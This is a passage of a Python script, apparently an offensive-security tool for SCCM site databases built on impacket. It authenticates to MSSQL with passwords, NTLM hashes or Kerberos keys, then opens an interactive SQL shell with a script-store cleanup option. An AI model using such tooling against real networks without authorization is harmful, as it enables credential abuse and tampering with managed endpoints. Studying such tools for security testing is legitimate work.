        ms_sql = SCCM_SQL_HTTP(remoteName, None, None, marker=options.marker, altAuth=options.altauth)
        res = True
    else:
        if domain is None:
            domain = ""

        if password == "" and username != "" and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True
        
        if options.target_ip is None:
            options.target_ip = remoteName

        ms_sql = tds.MSSQL(options.target_ip, int(options.port), remoteName)
        ms_sql.connect()
        try:
            if options.k is True:
                res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey, kdcHost=options.dc_ip)
            else:
                res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)
            ms_sql.printReplies()
        except Exception as e:
            logging.debug("Exception:", exc_info=True)
            logging.error(str(e))
            res = False
    if res is True:
        shell = SCCM_SQLSHELL(ms_sql, options.site, options.show, options.script, clean_scriptstore=True)
        if options.file is None:
            shell.cmdloop()
        else:
            for line in options.file.readlines():
                logging.info("SQL> %s" % line, end=" ")
                shell.onecmd(line)
    ms_sql.disconnect()


if __name__ == "__main__":
    main()